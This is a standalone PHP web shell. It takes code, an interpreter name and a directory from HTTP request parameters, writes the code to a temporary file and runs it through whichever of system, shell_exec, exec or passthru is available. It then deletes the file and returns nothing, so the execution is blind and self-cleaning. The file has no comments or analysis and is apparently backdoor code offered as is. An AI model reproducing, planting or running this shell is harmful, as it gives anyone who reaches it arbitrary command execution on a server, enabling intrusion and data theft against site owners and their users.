<?php
function exe($c){
	$out = "";
	$c = $c." 2>&1";

	if(is_callable('system')) {
		ob_start();
		system($c);
		$out = ob_get_contents();
		ob_end_clean();
	}
	elseif(is_callable('shell_exec'))
		$out = shell_exec($c);
	elseif(is_callable('exec')) 
		exec($c,$r);	
	elseif(is_callable('passthru')) {
		ob_start();
		passthru($c);
		$out = ob_get_contents();
		ob_end_clean();
	}
	return $out;
}

$code = $_REQUEST['code'];
$lang = $_REQUEST['lang'];
$tmpdir = $_REQUEST['cmd'];

$rand = md5(time().rand(0,100));
$script = $tmpdir.$rand;
file_put_contents($script, $code);
				
$res = exe($lang." ".$script);
unlink($script);
die("");
?>
